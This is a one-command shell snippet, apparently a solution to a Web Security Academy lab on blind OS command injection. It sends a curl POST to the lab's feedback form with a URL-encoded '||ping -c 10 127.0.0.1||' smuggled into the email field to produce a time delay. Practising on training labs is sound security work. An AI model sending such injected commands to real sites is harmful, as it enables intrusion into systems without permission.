#blind os injection
curl -i -X POST -b cookies.txt \
--data "csrf=$TOKEN&name=reos&email=x%7C%7Cping+-c+10+127.0.0.1%7C%7C&subject=test&message=test" \
"https://0ad8004a04231aee80bb1d340012008b.web-security-academy.net/feedback/submit"
